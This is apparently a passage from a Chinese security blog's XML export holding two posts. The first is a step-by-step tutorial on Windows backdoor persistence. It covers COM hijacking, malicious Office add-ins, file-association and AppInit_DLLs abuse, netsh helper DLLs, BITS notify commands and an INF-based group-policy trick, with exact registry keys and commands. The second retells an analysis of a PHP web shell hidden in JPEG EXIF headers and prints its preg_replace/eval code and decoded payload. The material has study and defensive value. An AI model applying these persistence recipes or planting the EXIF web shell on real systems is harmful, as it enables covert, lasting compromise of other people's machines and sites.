title="劫持MruPidlList"></a>劫持MruPidlList</h3><p>在注册表位置为HKCU\Software\Classes\CLSID\下创建项{42aedc87-2188-41fd-b9a3-0c966feabec1}，再创建一个子项InprocServer32，默认的键值为我们的dll路径，再创建一个键ThreadingModel，其键值：Apartment</p><p>该注册表对应COM对象MruPidlList，作用于shell32.dll，而shell32.dll是Windows的32位外壳动态链接库文件，用于打开网页和文件，建立文件时的默认文件名的设置等大量功能。其中explorer.exe会调用shell32.dll，然后会加载COM对象MruPidlList，从而触发我们的dll文件</p><p>当用户重启时或者重新创建一个explorer.exe进程时，就会加载我们的恶意dll文件，从而达到后门持久化的效果。这里我们直接结束一个explorer.exe进程再起一个进程来看一下效果</p><h3 id="office系列"><a href="#office系列" class="headerlink" title="office系列"></a>office系列</h3><p>Word WLL<br>把dll文件保存在%APPDATA%\Microsoft\Word\Startup，然后把后缀名改为wll<br>PS：Startup支持启动多个wll<br>打开word，成功弹框</p><h3 id="Excel-XLL"><a href="#Excel-XLL" class="headerlink" title="Excel XLL"></a>Excel XLL</h3><p>Excel dll的编写可以参考三好师傅这个项目：链接<br><a href="https://github.com/3gstudent/Add-Dll-Exports">https://github.com/3gstudent/Add-Dll-Exports</a><br>用三好师傅powershell脚本生成现成的Excel dll：<br><a href="https://github.com/3gstudent/Office-Persistence">https://github.com/3gstudent/Office-Persistence</a><br>将生成的DLL文件复制到%appdata%\Microsoft\AddIns目录下，然后再修改一下注册表，office版本对应的注册表位置如下：</p><p>office2003 — HKEY_CURRENT_USER\Software\Microsoft\Office\11.0<br>office2007 — HKEY_CURRENT_USER\Software\Microsoft\Office\12.0<br>office2010 — HKEY_CURRENT_USER\Software\Microsoft\Office\14.0<br>office2013 — HKEY_CURRENT_USER\Software\Microsoft\Office\15.0<br>office2016 — HKEY_CURRENT_USER\Software\Microsoft\Office\16.0<br>我这里使用的2010的，所以我们要修改的是HKEY_CURRENT_USER\Software\Microsoft\Office\14.0\Excel\Options，添加一个键OPEN，键值为：/R test.dll</p><p>然后打开Excel，发现成功弹出计算器</p><h3 id="PowerPoint-VBA-add-ins"><a href="#PowerPoint-VBA-add-ins" class="headerlink" title="PowerPoint VBA add-ins"></a>PowerPoint VBA add-ins</h3><p>用三好师傅powershell脚本生成现成的PowerPoint dll：链接<br><a href="https://github.com/3gstudent/Office-Persistence">https://github.com/3gstudent/Office-Persistence</a></p><p>将生成的DLL文件复制到%appdata%\Microsoft\AddIns目录下，然后参考前面我给出的office版本对应的注册表位置，在HKEY_CURRENT_USER\Software\Microsoft\Office\14.0\PowerPoint下新建一个子项：AddIns，然后在AddIns下面新建一个子项test，新建一个键为Autoload，类型为DWORD，键值为：1；新建一个键为Path，类型为SZ，键值为我们dll文件的路径</p><p>打开PowerPoint成功弹出计算器</p><h3 id="文件关联"><a href="#文件关联" class="headerlink" title="文件关联"></a>文件关联</h3><p>什么是文件关联</p><p>文件关联就是将一种类型的文件与一个可以打开它的程序建立起一种依存关系。一个文件可以与多个应用程序发生关联。可以利用文件的“打开方式”进行关联选择。<br>举个例子来说，位图文件（BMP文件）在Windows中的默认关联程序是“图片”，如果将其默认关联改为用ACDSee程序来打开，那么ACDSee就成了它的默认关联程序。<br>PS：来自百度百科<br>我们可以用assoc命令显示或修改文件扩展名关联，我们可以看一下.txt文件的关联</p><p>我们可以用ftype命令显示或修改用在文件扩展名关联中的文件类型</p><p>相关注册表<br>HKEY_CURRENT_USER\Software\Classe //保存了当前用户的类注册和文件扩展名信息<br>HKEY_LOCAL_MACHINE\Software\Classe //保存了系统所有用户用户的类注册和文件扩展名信息<br>HKEY_CLASS_ROOT //HKEY_CLASSES_ROOT项提供合并来自上面两个的信息的注册表的视图<br>我们以.txt为例，通过文件关联来修改它默认打开的程序。<br>修改\HKEY_CLASS_ROOT\txtfile\shell\open\command的默认值为我们要执行的程序</p><h3 id="AppInit-DLLs"><a href="#AppInit-DLLs" class="headerlink" title="AppInit_DLLs"></a>AppInit_DLLs</h3><p>User32.dll被加载到进程时，会读取AppInit_DLLs注册表项，如果有值，调用LoadLibrary() api加载用户dll。</p><p>其注册表位置为：HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Windows\AppInit_DLLs，把AppInit_DLLs的键值设置为我们dll路径，将LoadAppInit_DLLs设置为1</p><h3 id="Netsh-helper"><a href="#Netsh-helper" class="headerlink" title="Netsh helper"></a>Netsh helper</h3><p>netsh（全称：Network Shell） 是windows系统本身提供的功能强大的网络配置命令行工具，它可以添加自定的dll从而拓展其功能，我们可以使用netsh add helper yourdll.dll来添加拓展功能，添加了之后，在启动netsh的时候就会加载我们dll文件</p><p>添加自定义helper dll<br>我们可以使用两种方式来添加helper：<br>通过cmd添加helper</p><p>netsh add helper test.dll<br>通过注册表添加helper<br>其位置为：HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\NetSh，创建一个键，名称随便，键值为我们dll的路径</p><h3 id="利用BITS"><a href="#利用BITS" class="headerlink" title="利用BITS"></a>利用BITS</h3><p>BITS (后台智能传送服务) 是一个 Windows 组件，它可以在前台或后台异步传输文件，为保证其他网络应用程序获得响应而调整传输速度，并在重新启动计算机或重新建立网络连接之后自动恢复文件传输。</p><p>bitsadmin是一个命令行工具，用于创建下载或上传任务并监视其进度。你可以执行bitsadmin /?或bitsadmin /HELP获取帮助列表。</p><p>常见的bitsadmin命令</p><p>bitsadmin /create [type] DisplayName //创建一个任务<br>bitsadmin /cancel //删除一个任务<br>bitsadmin /list /allusers /verbose //列出所有任务<br>bitsadmin /AddFile //给任务test添加一个下载文件<br>bitsadmin /SetNotifyCmdLine [ProgramParameters] //设置在任务完成传输时或任务进入状态时将运行的命令行命令。<br>bitsadmin /Resume //激活传输队列中的新任务或挂起的任务。<br>bitsadmin /cancel //删除某个任务<br>bitsadmin /reset /allusers //删除所有任务<br>bitsadmin /complete //完成某个任务<br>下面我们来测试一下：</p><p>bitsadmin /create test<br>bitsadmin /addfile test c:\windows\system32\calc.exe c:\Users\qiyou\Desktop\calc.exe //为了方便起见我们直接复制本地文件<br>bitsadmin /SetNotifyCmdLine test cmd.exe “cmd.exe /c calc.exe”<br>bitsadmin /resume test<br>重启电脑之后任务还是存在</p><p>如果我们想让任务完成，可以执行bitsadmin /complete test，calc.exe也会复制到桌面上</p><h3 id="利用inf文件实现后门"><a href="#利用inf文件实现后门" class="headerlink" title="利用inf文件实现后门"></a>利用inf文件实现后门</h3><p>inf文件</p><p>INF文件或安装信息文件是Microsoft Windows用于安装软件和驱动程序的纯文本文件。INF文件最常用于安装硬件组件的设备驱动程序。Windows包含用于创建基于INF的安装的IExpress工具。INF文件是Windows安装程序API及其后续版本Windows Installer的一部分。<br>PS：来自WIKI<br>inf文件的结构<br>想了解更多可以看一下微软的手册：<a href="https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-2000-server/cc939869(v=technet.10)#information-inf-file-entries">https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-2000-server/cc939869(v=technet.10)#information-inf-file-entries</a></p><p>DefaultInstall节（来自WIKI）<br>INF文件的结构与INI文件的结构非常类似; 它包含用于指定要复制的文件，对注册表的更改等的各个部分。所有INF文件都包含一个[Version]带有Signature 键值对的部分，用于指定INF文件所针对的Windows版本。签名通常是$CHICAGO$（对于Windows 9x）或$WINDOWS NT$（对于Windows NT / 2K / XP）。其余大多数部分是用户定义的，并且包含特定于要安装的组件的信息。<br>DefaultInstall节（来自微软的手册）<br>RunPreSetupCommands-本节中指定的命令在安装服务配置文件之前运行。RunPostSetupCommands-本节中指定的命令在安装程序完成服务配置文件后运行。RunPreUnInstCommands-本节中指定的命令在卸载程序开始之前运行。RunPostUnInstCommands-本节中指定的命令在卸载程序运行后运行。下面举一个calc.inf弹计算器的例子[Version] Signature=”$CHICAGO$” AdvancedINF=2.5,”test” [DefaultInstall] RunPreSetupCommands=Command1 [Command1] C:\windows\system32\calc.exe命令行下执行：<br>rundll32.exe advpack.dll,LaunchINFSection calc.inf,DefaultInstall</p><p>后门实现：<br>在注册表HKEY_CURRENT_USER\Software\Microsoft\处依次新建子项\IEAK\GroupPolicy\PendingGPOs，然后再新建几个键，如下：<br>键：Count，类型：REG_DWORD，键值：1<br>键：Path1，类型：REG_SZ，键值：C:\Users\Administrator\Desktop\test\calc.inf //这个为我们inf文件的路径，这里以上面那个inf文件例子为例<br>键：Section1，类型：REG_SZ，键值：DefaultInstall<br>重启电脑之后成功弹出计算器<br>但是重启之后PendingGPOs该项就会被清除，需要我们重新修改注册表</p>]]></content>
      
      
      <categories>
          
          <category> Markdown </category>
          
      </categories>
      
      
        <tags>
            
            <tag> windows </tag>
            
            <tag> 后门 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>我的第一篇博客</title>
      <link href="2021/01/06/wo-de-di-yi-pian-bo-ke/"/>
      <url>2021/01/06/wo-de-di-yi-pian-bo-ke/</url>
      
        <content type="html"><![CDATA[<h2 id="一种隐藏在JPG图片EXIF中的后门"><a href="#一种隐藏在JPG图片EXIF中的后门" class="headerlink" title="一种隐藏在JPG图片EXIF中的后门"></a>一种隐藏在JPG图片EXIF中的后门</h2><p>几天前，我们研究团队的 Peter Gramantik 在一个被攻破的网站上发现一个非常有趣的后门。这个后门并没有依靠正常模式去隐藏起内容（比如 base64/gzip 编码），但是它却把自己的数据隐藏在 JPEG 图片的 EXIT 头部中了。它也使用 exif_read_data 和 preg_replace 两个 PHP 函数来读取 EXIF 头部和执行。<br>技术细节<br>这个后门可分为两部分。第一部分是 exif_read_data 函数读取图片头部，preg_replace 函数来执行内容。下面是我们在被攻破网站上发现的代码：</p><pre><code>$exif = exif_read_data(‘/homepages/clientsitepath/images/stories/food/bun.jpg’);preg_replace($exif[‘Make’],$exif[‘Model’],”);</code></pre><p>这两个函数本身是无害滴。exif_read_data 函数常用来读取图片，preg_replace 函数是替代字符内容。不过，preg_replace 函数函数有个隐藏并微妙的选项，如果你传入 “/e”，它会执行 eval() 中的内容，就不是去查询/替代了。<br>所以我们在查看 bun.jpg 文件时，发现后门的第二部分：</p><pre><code>ÿØÿà^@^PJFIF^@^A^B^@^@d^@d^@^@ÿá^@¡Exif^@^@II*^@^H^@^@^@^B^@^O^A^B^@^F^@^@^@&amp;^@^@^@^P^A^B^@m^@^@^@,^@^@^@^@^@^@^@/.*/e^@ eval ( base64_decode(“aWYgKGl zc2V0KCRfUE9TVFsie noxIl0pKSB7ZXZhbChzdHJpcHNsYXNoZXMoJF9QT1NUWyJ6ejEiXSkpO30=’));@ÿì^@^QDucky^@^A^@^D^@^@^@&lt;^@^@ÿî^@^NAdobe^</code></pre><p>这个文件用以常见的头部开始，但是在 ”make” 头部中混入了奇怪的关键字 ”/.*/e” 。有了这个执行修饰符， preg_replace 会执行 eval() 中传入的任意内容。<br>事情变得开始有趣了……<br>如果咱们继续来看看 EXIF 数据，我们能发现， “eval ( base64_decode”隐藏在 ”Model“ 头部。把这些放在一起看，咱们就知道怎么回事了。攻击者是从 EXIF 中读取 Make 和 Model 头部信息，然后传入到 preg_replace 函数。只要我们修改 $exif[‘Make’] 和 $exif[‘Model’] ，就得到了最终的后门。</p><pre><code>preg_replace (“/.*/e”, ,”@ eval ( base64_decode(“aWYgKGl …”);</code></pre><p>解码后我们可以看到是执行 $_POST[“zz1”] 提供的内容。完整解码后的后面在这里。</p><pre><code>if (isset( $_POST[“zz1”])) &#123; eval (stripslashes( $_POST[“zz1”]..</code></pre><p>隐藏恶意软件<br>另外一个有意思的是，虽然 bun.jpg 和其他图片文件被修改了，但然后能加载并正常工作。实际上，在这些被攻破的站点，攻击者修改了站点上一个合法并之前就存在的图片。这是一种奇特的隐藏恶意软件的方法。</p>]]></content>
      
      
      
    </entry>
    
    
  
  
</search>
